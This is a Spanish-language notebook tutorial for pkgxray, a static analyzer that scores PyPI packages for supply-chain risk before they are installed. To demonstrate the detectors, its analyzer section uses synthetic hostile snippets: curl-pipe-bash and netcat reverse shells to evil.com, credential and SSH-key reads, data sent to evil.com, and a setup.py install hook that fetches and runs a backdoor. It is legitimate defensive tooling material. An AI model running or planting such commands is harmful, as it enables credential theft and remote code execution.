# pkgxray v1.0.0 — Guía completa e interactiva

[![PyPI](https://img.shields.io/pypi/v/pkgxray)](https://pypi.org/project/pkgxray/)
[![Python](https://img.shields.io/pypi/pyversions/pkgxray)](https://pypi.org/project/pkgxray/)

> **¿Qué es pkgxray?**  
> pkgxray analiza paquetes de PyPI **antes de instalarlos**. Descarga el código fuente,
> lo inspecciona con 10 analizadores basados en AST y produce un reporte de riesgo (0–100).
> Nunca ejecuta el código del paquete.

---

## Contenido de este notebook

| Parte | Tema |
|-------|------|
| 0 | Instalación y verificación |
| 1 | CLI — escaneo desde la terminal |
| 2 | API Python — escaneo programático |
| 3 | Arquitectura interna del pipeline |
| 4 | Los 10 analizadores en detalle (con ejemplos sintéticos) |
| 5 | Sistema de puntuación: pesos, topes y combos |
| 6 | Antes y después: v0.3.0 → v1.0.0 |
| 7 | Formatos de salida: terminal, JSON y HTML |
| 8 | Caché en disco y LRU eviction |
| 9 | Registros PyPI privados |
| 10 | CI/CD: `--fail-above` y logging verbose |
| 11 | Comparativa de paquetes reales |
| 12 | Limitaciones conocidas |

---
## Parte 0 — Instalación y verificación

Instalamos pkgxray directamente desde PyPI. Si ya lo tienes instalado,
`--upgrade` asegura que tengas la versión más reciente (v1.0.0).

In [ ]:
!pip install pkgxray --upgrade --quiet

import pkgxray
print(f'✓ pkgxray {pkgxray.__version__} instalado correctamente')

In [ ]:
!pkgxray --help

---
## Parte 1 — CLI: escaneo desde la terminal

La forma más directa de usar pkgxray es `pkgxray scan <paquete>`.
Escaneamos tres paquetes con perfiles de riesgo distintos para calibrar el scorer:

1. `more-itertools` — utilidades puras → esperamos **LOW**
2. `requests` — hace conexiones HTTP → esperamos **MODERATE**
3. `paramiko` — SSH: red + subprocess + sistema → esperamos **HIGH**

In [ ]:
# Paquete de utilidades puras — sin red ni llamadas al sistema
!pkgxray scan more-itertools

In [ ]:
# requests — HTTP library legítima pero con muchas llamadas de red
!pkgxray scan requests

In [ ]:
# paramiko — implementa SSH: alto riesgo por diseño
!pkgxray scan paramiko

### Todas las opciones del CLI

| Flag | Descripción | Ejemplo |
|------|-------------|--------|
| `--version TEXT` | Versión específica | `pkgxray scan requests --version 2.20.0` |
| `--format json\|html` | Formato de salida | `pkgxray scan flask --format json` |
| `--output PATH` | Guardar en archivo | `pkgxray scan flask -o report.html` |
| `--fail-above N` | Falla si score ≥ N (CI/CD) | `pkgxray scan pkg --fail-above 60` |
| `--verbose` | Logging de debug | `pkgxray scan pkg --verbose` |
| `--index-url URL` | Registro privado | `pkgxray scan pkg --index-url https://...` |

In [ ]:
!pkgxray scan requests --version 2.20.0

---
## Parte 2 — API Python: escaneo programático

Además del CLI, pkgxray expone una API Python completa para integrarse en
scripts, pipelines de CI/CD o notebooks. La función principal es `pkgxray.scan()`.

In [ ]:
from pkgxray import scan, ScanResult, Finding, Severity

result = scan('requests')

print(f'Paquete          : {result.package_name} {result.version}')
print(f'Fecha de escaneo : {result.scan_date}')
print(f'Score de riesgo  : {result.risk_score} / 100')
print(f'Nivel de riesgo  : {result.risk_level}')
print(f'Archivos analizados : {result.files_analyzed}')
print(f'Archivos binarios   : {result.binary_files_found} (no analizados)')
print(f'Archivos omitidos   : {len(result.skipped_files)}')
print(f'Resumen          : {result.summary}')

### 2.1 Todos los campos de `ScanResult` via introsopección

In [ ]:
# Usando dataclasses.fields() para listar todos los campos automáticamente
# (misma técnica que usa el colaborador — más robusto que documentarlo a mano)
from dataclasses import fields
from pkgxray.analyzers.base import ScanResult

print('Campos de ScanResult:')
for f in fields(ScanResult):
    print(f'  {f.name:25s} : {f.type}')

### 2.2 Inspeccionando findings — ordenados por severidad

In [ ]:
# Hallazgos ordenados de CRITICAL a LOW
sev_order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]
sorted_findings = sorted(result.findings, key=lambda f: sev_order.index(f.severity))

print(f'Total de hallazgos: {len(sorted_findings)}\n')
for f in sorted_findings[:8]:
    print(f'  [{f.severity.value.upper():8}] {f.analyzer_name:20} {f.filename.split("/")[-1]:30} L{f.line_number}')
    print(f'             {f.description[:75]}')
    print()

In [ ]:
# Resumen por analizador y por severidad
from collections import Counter

por_analizador = Counter(f.analyzer_name for f in result.findings)
por_severidad  = Counter(f.severity.value for f in result.findings)

print('Por analizador:')
for nombre, n in por_analizador.most_common():
    print(f'  {nombre:25} {n:3} hallazgos')

print()
print('Por severidad:')
for sev in ['critical', 'high', 'medium', 'low']:
    n = por_severidad.get(sev, 0)
    bar = '█' * n
    print(f'  {sev:8} {bar:30} {n}')

In [ ]:
# Archivos omitidos (errores de sintaxis, encoding, etc.)
if result.skipped_files:
    print('Archivos omitidos:')
    for s in result.skipped_files:
        print(f"  {s['filename']}: {s['reason']}")
else:
    print('✓ Todos los archivos fueron analizados correctamente')

print(f'\nArchivos binarios encontrados (no analizados): {result.binary_files_found}')

---
## Parte 3 — Arquitectura interna del pipeline

Antes de ver los analizadores en detalle, conviene entender cómo fluye
la información dentro de pkgxray. El pipeline tiene 5 etapas secuenciales:

```
User / CLI
    │
    ▼
scanner.scan(package_name, version)     ← punto de entrada único
    │
    ├─► downloader.py                   ← descarga de PyPI / registro privado
    │       └─ verifica SHA-256
    │
    ├─► extractor.py                    ← descomprime .tar.gz / .whl
    │       └─ valida path traversal, límite 5 MB por archivo
    │
    ├─► analyzers/ (×10)                ← AST compartido entre todos
    │       ├─ code_exec
    │       ├─ subprocess_calls
    │       ├─ network
    │       ├─ obfuscation
    │       ├─ filesystem
    │       ├─ env_access
    │       ├─ dynamic_imports
    │       ├─ setup_scripts      (solo setup.py)
    │       ├─ config_files       (solo pyproject.toml / setup.cfg)
    │       └─ process_spawn      (nuevo en v1.0.0)
    │
    ├─► scorer.py                       ← pesos + caps + combos → score 0-100
    │
    ├─► _disk_cache.py                  ← persiste resultado por SHA-256
    │
    └─► reporter.py                     ← terminal / JSON / HTML
```

**Clave de diseño:** el AST de cada archivo se parsea **una sola vez** y se comparte
entre todos los analizadores. Esto evita parsear N veces el mismo archivo y
hace que el pipeline sea O(archivos) en lugar de O(archivos × analizadores).

In [ ]:
# Listar los 10 analizadores registrados con su descripción
from pkgxray.analyzers import get_all_analyzers

print(f"{'Analizador':25} {'Descripción'}")
print('-' * 85)
for az in get_all_analyzers():
    print(f'{az.name:25} {az.description}')

---
## Parte 4 — Los 10 analizadores en detalle

Probamos cada analizador con fragmentos de código sintéticos.
Primero definimos un helper reutilizable que prepara el AST una sola vez
y lo pasa a todos los analizadores — igual que hace el scanner internamente.

In [ ]:
import ast
from pkgxray.analyzers.base import build_parent_map, collect_import_aliases

def analyze_snippet(source: str, analyzers: list, filename: str = 'ejemplo.py'):
    """Corre una lista de analizadores sobre un fragmento de código.
    Prepara el AST, parent_map y aliases una sola vez — igual que el scanner real.
    """
    try:
        tree = ast.parse(source)
    except SyntaxError as e:
        print(f'Error de sintaxis: {e}')
        return

    parent_map = build_parent_map(tree)
    aliases    = collect_import_aliases(tree)

    all_findings = []
    for az in analyzers:
        findings = az.analyze(source, filename, tree=tree, parent_map=parent_map, aliases=aliases)
        all_findings.extend(findings)

    if not all_findings:
        print('Sin hallazgos.')
        return

    for f in all_findings:
        print(f'  [{f.severity.value.upper():8}] {f.analyzer_name}: {f.description}')
        if f.code_snippet:
            print(f'             Línea {f.line_number}: {f.code_snippet[:80]}')
        print()

print('✓ Helper analyze_snippet() listo')

### 4.1 `code_exec` — Ejecución dinámica de código

Detecta `eval()`, `exec()`, `compile()`, `ctypes.CDLL()` y acceso indirecto
a estas funciones vía `__builtins__` (nuevo en v1.0.0).
Llamadas a nivel de módulo se escalan a **CRITICAL** porque se ejecutan al importar.

In [ ]:
from pkgxray.analyzers.code_exec import CodeExecAnalyzer

# Escenario 1: uso directo
print('--- Uso directo de exec/eval ---')
analyze_snippet('''
import base64
exec("import os")        # nivel de módulo → CRITICAL
def f():
    eval(data)           # dentro de función → HIGH
''', [CodeExecAnalyzer()])

# Escenario 2 (NUEVO v1.0.0): acceso indirecto vía __builtins__
print('--- Acceso indirecto vía __builtins__ (nuevo v1.0.0) ---')
analyze_snippet('''
__builtins__["exec"](payload)        # subscript en __builtins__
vars()["eval"](malicious_code)        # subscript en vars()
getattr(__builtins__, "exec")(payload) # getattr en builtins
''', [CodeExecAnalyzer()])

# Escenario 3: ctypes
print('--- ctypes — carga de librerías nativas ---')
analyze_snippet('''
import ctypes
lib = ctypes.CDLL("malicious.so")   # CRITICAL
''', [CodeExecAnalyzer()])

### 4.2 `obfuscation` — Ofuscación de código

Detecta `exec(base64.b64decode(...))` (patrón clásico de malware), variantes en dos pasos,
`codecs.decode()` con rot13 y `bytes.fromhex()`.  
**Importante:** `base64.b64decode()` aislado **no** se reporta — es legítimo para imágenes, TLS y auth.

In [ ]:
from pkgxray.analyzers.obfuscation import ObfuscationAnalyzer

print('--- Patrón clásico: exec(base64.b64decode(...)) ---')
analyze_snippet('''
import base64
exec(base64.b64decode("cHJpbnQoJ2hpJyk="))   # CRITICAL
payload = base64.b64decode("cHJpbnQoJ2hpJyk=")
exec(payload)                                 # CRITICAL (dos pasos)
data = base64.b64decode("aGVsbG8=")           # legítimo — NO se reporta
''', [ObfuscationAnalyzer()])

print('--- Otros: rot13 y hex ---')
analyze_snippet('''
import codecs
code = codecs.decode("vzcbeg bf", "rot13")   # MEDIUM
payload = bytes.fromhex("696d706f7274206f73") # MEDIUM
''', [ObfuscationAnalyzer()])

### 4.3 `subprocess` — Ejecución de comandos del sistema

Detecta `os.system()`, `subprocess.Popen()`, `pty.spawn()`, `asyncio.create_subprocess_shell()` y variantes.
Solo reporta **llamadas reales** — `import subprocess` no genera hallazgos.

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer

analyze_snippet('''
import subprocess, os

# Nivel de módulo → CRITICAL (se ejecuta al importar)
os.system("curl http://evil.com/payload | bash")

def instalar():
    subprocess.run(["pip", "install", "backdoor"])   # HIGH
    subprocess.Popen(["nc", "-e", "/bin/sh", "evil.com", "4444"])  # CRITICAL
''', [SubprocessAnalyzer()])

# Solo importar NO genera hallazgos
print('import subprocess sin llamadas:')
analyze_snippet('import subprocess', [SubprocessAnalyzer()])

### 4.4 `network` — Conexiones de red

Detecta solicitudes HTTP y conexiones de socket. Rastrea instancias de clientes HTTP:
si `self.session = requests.Session()`, entonces `self.session.post(url)` se detecta.
También resuelve aliases de importación.

In [ ]:
from pkgxray.analyzers.network import NetworkAnalyzer

analyze_snippet('''
import requests, httpx

# Nivel de módulo → CRITICAL
import urllib.request
urllib.request.urlopen("http://evil.com/c2")

class Exfiltrador:
    def __init__(self):
        self.session = requests.Session()

    def enviar(self, datos):
        self.session.post("http://evil.com/collect", data=datos)  # HIGH (rastreo de instancia)

# dict.get() NO se reporta — el receptor no es un cliente HTTP
config = {"key": "value"}
value = config.get("key")
''', [NetworkAnalyzer()])

### 4.5 `env_access` — Acceso a variables de entorno

Variables sensibles (API keys, tokens, passwords) → HIGH.  
Si el acceso ocurre a nivel de módulo → CRITICAL (credenciales robadas al importar).  
Resuelve aliases: `import os as operating_system` funciona igual.

In [ ]:
from pkgxray.analyzers.env_access import EnvAccessAnalyzer

analyze_snippet('''
import os as operating_system

# Nivel de módulo — credenciales robadas al importar → CRITICAL
aws_key  = operating_system.environ["AWS_SECRET_ACCESS_KEY"]
gh_token = operating_system.getenv("GITHUB_TOKEN")
ai_key   = operating_system.environ.get("OPENAI_API_KEY")

def leer_config():
    db_url = operating_system.getenv("DATABASE_URL")  # HIGH (sensible, en función)
    home   = operating_system.environ["HOME"]          # LOW  (no sensible)
    return db_url
''', [EnvAccessAnalyzer()])

### 4.6 `filesystem` — Accesos sospechosos al sistema de archivos

Detecta operaciones destructivas (`os.remove`, `shutil.rmtree`) y accesos a rutas sensibles
(`~/.ssh/`, `~/.aws/`, `/etc/passwd`, etc.).  
**Corrección clave v0.3.0:** `list.remove(x)` ya **no** genera falsos positivos.

In [ ]:
from pkgxray.analyzers.filesystem import FilesystemAnalyzer

print('--- Operaciones destructivas y rutas sensibles ---')
analyze_snippet('''
import os, shutil
from pathlib import Path

with open("/etc/passwd") as f: data = f.read()              # CRITICAL
ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()  # CRITICAL
aws_cfg = open(os.path.expanduser("~/.aws/credentials")).read()  # HIGH

shutil.rmtree("/tmp/legit_dir")   # HIGH
os.remove("/important/file.db")   # HIGH
''', [FilesystemAnalyzer()])

print('--- list.remove() / set.remove() (no deben reportarse) ---')
analyze_snippet('''
items = [1, 2, 3]
items.remove(2)   # falso positivo en v0.2.x — corregido en v0.3.0
seen = {1, 2, 3}
seen.remove(1)    # idem
''', [FilesystemAnalyzer()])

### 4.7 `dynamic_imports` — Importaciones dinámicas

Detecta `__import__()`, `importlib.import_module()` y `importlib.util.spec_from_file_location()`.
Distingue entre argumentos estáticos (MEDIUM) y dinámicos (HIGH).
Resuelve aliases: `import importlib as il; il.import_module(x)` es detectado.

In [ ]:
from pkgxray.analyzers.dynamic_imports import DynamicImportAnalyzer

analyze_snippet('''
import importlib

mod = importlib.import_module("json")     # estático → MEDIUM
__import__("hashlib")                      # estático → MEDIUM

user_mod = importlib.import_module(user_input)  # dinámico → HIGH
__import__(variable)                            # dinámico → HIGH

# Carga de archivo arbitrario — vector de supply chain
spec = importlib.util.spec_from_file_location("evil", "/tmp/backdoor.py")  # HIGH/CRITICAL
''', [DynamicImportAnalyzer()])

# Alias también detectado
print('--- Alias de importlib ---')
analyze_snippet('''
import importlib as il
il.import_module(dynamic_name)  # detectado aunque esté aliasado
''', [DynamicImportAnalyzer()])

### 4.8 `setup_scripts` — Hooks de instalación maliciosos

Solo actúa sobre archivos llamados `setup.py`. Detecta clases que heredan de
comandos de setuptools (`install`, `develop`, `build_ext`...) con métodos `run()` o `__init__()`:  
estos se ejecutan **automáticamente** durante `pip install`.

In [ ]:
from pkgxray.analyzers.setup_scripts import SetupScriptAnalyzer

print('--- setup.py malicioso con PostInstall hook ---')
analyze_snippet('''
from setuptools import setup
from setuptools.command.install import install
import subprocess, urllib.request

class PostInstall(install):       # hereda de install → hook de pip
    def run(self):                # run() se invoca automáticamente → CRITICAL
        install.run(self)
        urllib.request.urlretrieve("http://evil.com/backdoor.py", "/tmp/b.py")
        subprocess.Popen(["python", "/tmp/b.py"])

setup(name="trampa", cmdclass={"install": PostInstall})
''', [SetupScriptAnalyzer()], filename='setup.py')

# En otro archivo: el analizador no actúa
print('--- Mismo código en utils.py (no actúa) ---')
analyze_snippet('from setuptools.command.install import install\nclass H(install):\n    def run(self): pass',
                [SetupScriptAnalyzer()], filename='utils.py')

### 4.9 `config_files` — Configuración sospechosa en TOML/CFG

Analiza `pyproject.toml` y `setup.cfg` buscando dependencias de build inusuales,
entrypoints con comandos shell y post-install hooks declarados.

In [ ]:
from pkgxray.analyzers.config_files import ConfigFileAnalyzer

print('--- pyproject.toml malicioso ---')
analyze_snippet('''
[build-system]
requires = ["hatchling", "requests", "paramiko"]  # requests en build → HIGH

[project.scripts]
mi-tool     = "mi_paquete.cli:main"               # legítimo
post-install = "bash -c curlevil.com/payload|bash" # shell command → CRITICAL

[tool.hatch.build.hooks.custom]
path = "hatch_build.py"  # post-install hook → MEDIUM
''', [ConfigFileAnalyzer()], filename='pyproject.toml')

print('--- pyproject.toml limpio (sin hallazgos) ---')
analyze_snippet('''
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[project.scripts]
pkgxray = "pkgxray.cli:main"
''', [ConfigFileAnalyzer()], filename='pyproject.toml')

### 4.10 `process_spawn` — Spawn de procesos con targets peligrosos *(NUEVO v1.0.0)*

Cierra una brecha de evasión: el analizador de `subprocess` detecta llamadas directas
como `os.system('cmd')`, pero **no** detecta cuando esa función se pasa como referencia
a `Process(target=...)` o `executor.submit(...)`. Este analizador cubre exactamente ese caso.

In [ ]:
from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer

analyze_snippet('''
import os, subprocess
from multiprocessing import Process
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

# Evasión: no hay llamada directa a os.system — se pasa como referencia
Process(target=os.system, args=("curl evil.com | bash",)).start()   # HIGH
Thread(target=subprocess.Popen, args=(["nc", "-e", "/bin/sh"],)).start()  # HIGH

# executor.submit — primer arg es el callable
with ThreadPoolExecutor() as ex:
    ex.submit(os.system, "wget evil.com/p -O /tmp/p && bash /tmp/p")

# Alias de importación — también detectado
import os as operating_system
Process(target=operating_system.system, args=("id",))
''', [ProcessSpawnAnalyzer()])

---
## Parte 5 — Sistema de puntuación: pesos, topes y combos

El scorer convierte los hallazgos en un puntaje 0–100 con tres componentes:
**pesos base** por severidad, **topes** por analizador, y **bonificaciones** por combos peligrosos.

In [ ]:
from pkgxray import scorer as pkgxray_scorer

print('=== Pesos por severidad ===')
for sev, peso in pkgxray_scorer.SEVERITY_WEIGHTS.items():
    print(f'  {sev.name:8} = {peso:2} puntos por hallazgo')

print()
print('=== Topes por analizador (cap) ===')
print('  Evita que un solo analizador con muchos hallazgos domine el score')
for nombre, cap in sorted(pkgxray_scorer.ANALYZER_CAPS.items(), key=lambda x: -x[1]):
    print(f'  {nombre:25} máximo {cap:3} pts')

print()
print('=== Bonificaciones por combinaciones peligrosas ===')
for combo, bonus in sorted(pkgxray_scorer.DANGEROUS_COMBOS.items(), key=lambda x: -x[1]):
    nombres = ' + '.join(sorted(combo))
    print(f'  {nombres:45} +{bonus} pts')

In [ ]:
# Demostración del scorer con hallazgos sintéticos
from pkgxray.analyzers.base import Finding, Severity
from pkgxray import scorer as sc

def hacer_finding(analizador, severidad):
    return Finding(analyzer_name=analizador, severity=severidad,
                   description='test', filename='test.py', line_number=1, code_snippet='')

# Escenario: exfiltración de credenciales
findings = [
    hacer_finding('env_access',  Severity.CRITICAL),
    hacer_finding('env_access',  Severity.CRITICAL),
    hacer_finding('network',     Severity.CRITICAL),
    hacer_finding('network',     Severity.HIGH),
    hacer_finding('obfuscation', Severity.CRITICAL),
    hacer_finding('code_exec',   Severity.CRITICAL),
]

score, level, combos_activos = sc.calculate_score(findings)
print(f'Score : {score}/100')
print(f'Nivel : {level}')
print(f'Combos activos: {"+".join(sorted(c)) for c in combos_activos}')
print()
print('Niveles de riesgo:')
for rango, nivel in [("0-15","LOW"),("16-35","MODERATE"),("36-60","HIGH"),("61-100","CRITICAL")]:
    print(f'  {rango:7} → {nivel}')

---
## Parte 6 — Antes y después: v0.3.0 → v1.0.0

Demostramos con código concreto qué no se detectaba antes y qué se detecta ahora.

### 6.1 Correcciones de v0.3.0

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.filesystem import FilesystemAnalyzer

# CORRECCIÓN 1: ClassDef ya no bloquea escalado a módulo
print('--- ClassDef: antes HIGH, ahora CRITICAL ---')
analyze_snippet('''
import os
class Config:            # cuerpo de clase se ejecuta al importar
    os.system("id")      # v0.2.x: HIGH  →  v0.3.0+: CRITICAL
''', [SubprocessAnalyzer()])

# CORRECCIÓN 2: list.remove() ya no es falso positivo
print('--- list.remove() / set.remove(): antes HIGH, ahora 0 hallazgos ---')
analyze_snippet('''
items = [1, 2, 3]
items.remove(2)   # v0.2.x: HIGH (falso positivo) → v0.3.0+: sin hallazgo
''', [FilesystemAnalyzer()])

### 6.2 Nuevas detecciones de v1.0.0

In [ ]:
from pkgxray.analyzers.subprocess_calls import SubprocessAnalyzer
from pkgxray.analyzers.process_spawn import ProcessSpawnAnalyzer
from pkgxray.analyzers.code_exec import CodeExecAnalyzer

codigo_evasion = '''
import os
from multiprocessing import Process
Process(target=os.system, args=("curl evil.com | bash",)).start()
'''

print('NUEVO 1 — ProcessSpawnAnalyzer (evasión de subprocess):')
f_sub   = []
f_spawn = []
try:
    tree = __import__('ast').parse(codigo_evasion)
    pm = __import__('pkgxray.analyzers.base', fromlist=['build_parent_map']).build_parent_map(tree)
    al = __import__('pkgxray.analyzers.base', fromlist=['collect_import_aliases']).collect_import_aliases(tree)
    f_sub   = SubprocessAnalyzer().analyze(codigo_evasion, 'ev.py', tree=tree, parent_map=pm, aliases=al)
    f_spawn = ProcessSpawnAnalyzer().analyze(codigo_evasion, 'ev.py', tree=tree, parent_map=pm, aliases=al)
except Exception as e:
    print(f'Error: {e}')

print(f'  SubprocessAnalyzer  (v0.3.0) → {len(f_sub)} hallazgos   ← no lo detectaba')
print(f'  ProcessSpawnAnalyzer (v1.0.0) → {len(f_spawn)} hallazgos  ← detectado')
print()

print('NUEVO 2 — Acceso indirecto a exec vía __builtins__:')
analyze_snippet('''
__builtins__["exec"](payload)          # v0.3.0: no detectado
getattr(__builtins__, "exec")(payload)  # v1.0.0: CRITICAL
''', [CodeExecAnalyzer()])

---
## Parte 7 — Formatos de salida: terminal, JSON y HTML

In [ ]:
!pkgxray scan flask --format json

In [ ]:
import json
from pkgxray import scan
from pkgxray.reporter import generate_report

result = scan('flask')
json_str = generate_report(result, format='json')
data = json.loads(json_str)

print(f"Paquete : {data['package_name']} {data['version']}")
print(f"Score   : {data['risk_score']} ({data['risk_level']})")
print(f"Resumen : {data['summary']}")

In [ ]:
# Reporte HTML renderizado en el notebook
from pkgxray.reporter import generate_report
from IPython.display import HTML, display

html_content = generate_report(result, format='html')
display(HTML(html_content))

In [ ]:
# Guardar en disco
!pkgxray scan click --format html --output /tmp/click_report.html
print('Reporte guardado en /tmp/click_report.html')

---
## Parte 8 — Caché en disco y LRU eviction

pkgxray mantiene un caché persistente entre sesiones. La clave es el SHA-256 del archivo
descargado. **Nuevo en v1.0.0:** LRU eviction automática cuando el caché supera 200 entradas.

In [ ]:
import time
from pkgxray import scan, clear_cache, clear_disk_cache
from pkgxray._disk_cache import get_cache_dir, MAX_CACHE_ENTRIES, EVICT_COUNT

print(f'Directorio de caché : {get_cache_dir()}')
print(f'Máximo de entradas  : {MAX_CACHE_ENTRIES}')
print(f'Entradas a evictar  : {EVICT_COUNT} cuando se supera el límite')
print()

clear_disk_cache()
clear_cache()

t0 = time.time()
r1 = scan('more-itertools')
t1 = time.time() - t0

t0 = time.time()
r2 = scan('more-itertools')
t2 = time.time() - t0

print(f'Primera llamada (sin caché) : {t1:.2f}s')
print(f'Segunda llamada (con caché) : {t2:.4f}s')
print(f'Aceleración: ~{t1/max(t2,0.001):.0f}x más rápido')

In [ ]:
# Ver archivos en el caché de disco
cache_dir = get_cache_dir()
if cache_dir.exists():
    archivos = list(cache_dir.glob('*.json'))
    print(f'Archivos en caché de disco: {len(archivos)}')
    for f in archivos[:3]:
        print(f'  {f.name[:20]}... ({f.stat().st_size} bytes)')
else:
    print('Caché de disco vacío')

n = clear_disk_cache()
print(f'\nCaché limpiado: {n} archivos eliminados')

---
## Parte 9 — Registros PyPI privados

pkgxray puede analizar paquetes en registros privados. Solo acepta `http://` y `https://`
para prevenir ataques SSRF.

In [ ]:
# Tres formas equivalentes de configurar el registro
from pkgxray import scan

# 1. Argumento directo
# result = scan('mi-paquete', registry_url='https://pypi.miempresa.com/simple/')

# 2. Variable de entorno
# import os
# os.environ['PKGXRAY_INDEX_URL'] = 'https://pypi.miempresa.com/simple/'
# result = scan('mi-paquete')

# 3. CLI
# !pkgxray scan mi-paquete --index-url https://pypi.miempresa.com/simple/

# Validación de seguridad: URLs con esquemas peligrosos son rechazadas
try:
    scan('test', registry_url='file:///etc/passwd')  # SSRF
except Exception as e:
    print(f'URL rechazada: {type(e).__name__}')

print('Solo se aceptan esquemas http:// y https://')

---
## Parte 10 — CI/CD: `--fail-above` y logging verbose

### 10.1 Integración CI/CD

```yaml
# GitHub Actions
- name: Auditar dependencia
  run: |
    pip install pkgxray
    pkgxray scan ${{ matrix.package }} --fail-above 60
```

In [ ]:
from pkgxray import scan

UMBRAL = 50
dependencias = ['more-itertools', 'attrs', 'click', 'flask']

print(f'Auditando {len(dependencias)} dependencias (umbral: {UMBRAL}/100)\n')
for paquete in dependencias:
    r = scan(paquete)
    estado = '✓ APROBADO' if r.risk_score < UMBRAL else '✗ RECHAZADO'
    print(f'  {estado}  {paquete:25} score={r.risk_score:3}/100  [{r.risk_level}]')

In [ ]:
# Códigos de salida del CLI
!pkgxray scan more-itertools --fail-above 80 && echo 'Exit 0 — aprobado' || echo 'Exit 1 — bloqueado'
print()
!pkgxray scan paramiko --fail-above 20 && echo 'Exit 0 — aprobado' || echo 'Exit 1 — bloqueado por umbral'

### 10.2 Logging verbose — debug del pipeline

Con `--verbose` en el CLI (o `logging.DEBUG` en la API) se ven los pasos internos
del pipeline: qué analizadores corren, qué archivos se omiten y por qué.

In [ ]:
import logging

# Activar logging.DEBUG para ver los pasos internos del scanner
logging.basicConfig(
    level=logging.DEBUG,
    format='%(levelname)-8s %(name)s: %(message)s'
)

from pkgxray import scan
r = scan('more-itertools')   # verás los pasos del pipeline en el output

# Desactivar para el resto del notebook
logging.disable(logging.DEBUG)
print(f'\nScan completado: {r.risk_score}/100 [{r.risk_level}]')

---
## Parte 11 — Comparativa de paquetes reales

Analizamos un conjunto diverso de paquetes para validar que el scorer calibra correctamente.

In [ ]:
from pkgxray import scan

paquetes = [
    ('more-itertools', 'utilidades puras'),
    ('attrs',          'dataclasses avanzado'),
    ('click',          'CLI framework'),
    ('flask',          'web framework'),
    ('requests',       'HTTP library'),
    ('boto3',          'AWS SDK (muchos env_access)'),
    ('paramiko',       'SSH library'),
]

print(f"{'Paquete':20} {'Score':>5}  {'Nivel':10}  {'Descripción'}")
print('-' * 65)

resultados = []
for nombre, desc in paquetes:
    r = scan(nombre)
    resultados.append((nombre, r.risk_score, r.risk_level, desc))
    print(f'{nombre:20} {r.risk_score:5}  {r.risk_level:10}  {desc}')

In [ ]:
try:
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches

    nombres = [r[0] for r in resultados]
    scores  = [r[1] for r in resultados]
    niveles = [r[2] for r in resultados]

    colores = {'LOW':'#22c55e','MODERATE':'#f59e0b','HIGH':'#f97316','CRITICAL':'#ef4444'}

    fig, ax = plt.subplots(figsize=(10, 5))
    bars = ax.barh(nombres, scores, color=[colores[n] for n in niveles])
    ax.set_xlabel('Risk Score (0-100)')
    ax.set_title('pkgxray v1.0.0 — Comparativa de paquetes reales')
    ax.set_xlim(0, 100)

    for x, label in [(15,'LOW'),(35,'MODERATE'),(60,'HIGH')]:
        ax.axvline(x, color='gray', linestyle='--', alpha=0.5, linewidth=0.8)
        ax.text(x+1, -0.7, label, fontsize=7, color='gray')

    for bar, score in zip(bars, scores):
        ax.text(score+0.5, bar.get_y()+bar.get_height()/2, str(score), va='center', fontsize=9)

    patches = [mpatches.Patch(color=c, label=n) for n, c in colores.items()]
    ax.legend(handles=patches, loc='lower right')
    plt.tight_layout()
    plt.show()

except ImportError:
    print('matplotlib no disponible — tabla ya mostrada arriba')

---
## Parte 12 — Limitaciones conocidas

pkgxray es una herramienta de análisis **estático**. Hay cosas que no puede detectar
por diseño o por limitaciones del análisis AST.

| Limitación | Impacto | Por qué existe |
|------------|---------|----------------|
| **Aliasing complejo** | `sp = subprocess; sp.run(...)` puede no detectarse si el alias se construye dinámicamente | El análisis AST solo ve el código estático, no el estado en tiempo de ejecución |
| **Extensiones binarias** | Los archivos `.so`, `.pyd`, `.dll` no se analizan | Requeriría análisis de código máquina o desensamblado, fuera del alcance |
| **Código generado en tiempo de ejecución** | `exec(generate_payload())` donde `generate_payload()` es opaca | El analizador ve el `exec()` pero no puede evaluar qué devuelve la función |
| **Dependencias transitivas** | Solo analiza el paquete solicitado, no sus dependencias | Escanear el árbol completo sería muy lento; úsalo junto con `pip audit` |
| **Ofuscación avanzada** | Técnicas muy sofisticadas pueden evadir la detección | El AST analysis tiene límites inherentes |
| **Falsos positivos en librerías legítimas** | `paramiko` o `boto3` tendrán scores altos aunque sean seguros | El scorer calibra esto con caps y combos, pero no es perfecto |

### ¿Qué hacer con estos límites?

- Usa pkgxray **junto con** `pip audit` (CVEs) y revisión manual para paquetes críticos
- Un score MODERATE/HIGH no significa necesariamente malicia — revisa los hallazgos
- Un score LOW no garantiza que el paquete sea seguro — puede usar evasión avanzada
- Para paquetes muy críticos, considera leer el código fuente directamente en PyPI

---
## Conclusión

Este notebook cubrió todas las funcionalidades de **pkgxray v1.0.0**:

| Funcionalidad | Parte |
|---------------|-------|
| CLI con todos sus flags | 1 |
| API Python — ScanResult, Finding, Severity | 2 |
| Arquitectura del pipeline + listado de analizadores | 3 |
| Los 10 analizadores con helper `analyze_snippet()` | 4 |
| Sistema de puntuación: pesos, caps y combos | 5 |
| Comparativa v0.3.0 → v1.0.0 | 6 |
| Formatos de salida: terminal, JSON, HTML | 7 |
| Caché en disco con LRU eviction | 8 |
| Registros privados y validación SSRF | 9 |
| CI/CD con `--fail-above` + logging verbose | 10 |
| Comparativa de paquetes reales con gráfica | 11 |
| Limitaciones conocidas | 12 |

```bash
pip install pkgxray
pkgxray scan <cualquier-paquete>
```